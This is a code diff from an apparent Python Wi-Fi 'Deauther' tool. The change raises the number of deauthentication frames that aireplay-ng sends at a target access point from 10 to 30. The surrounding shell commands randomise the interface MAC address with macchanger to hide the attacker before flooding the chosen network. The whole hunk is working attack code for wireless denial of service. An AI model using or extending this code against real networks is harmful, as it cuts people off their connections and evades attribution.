@@ -63,12 +63,12 @@ class Deauther:
 					time = datetime.now().strftime("%H:%M:%S")
 					status = ""
 					if counter == 0:
-						status = os.popen(f"ifconfig {self.interface}mon down&&macchanger -r {self.interface}mon&&ifconfig {self.interface}mon up&&iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 10 -a {value[0]} {self.interface}mon").read()
+						status = os.popen(f"ifconfig {self.interface}mon down&&macchanger -r {self.interface}mon&&ifconfig {self.interface}mon up&&iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 30 -a {value[0]} {self.interface}mon").read()
 						new_mac = os.popen(f"macchanger -s {self.interface}mon").read().split(" ")[4]
 						print(f"\n[+] New Mac: {str(new_mac)}")
 						counter+=1
 					else:
-						status = os.popen(f"iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 10 -a {value[0]} {self.interface}mon").read()
+						status = os.popen(f"iwconfig {self.interface}mon channel {value[1]} &&aireplay-ng --deauth 30 -a {value[0]} {self.interface}mon").read()
 					if "code 7" in status:
 						if key != "":
 							print(f"\nDeauth: {key}")
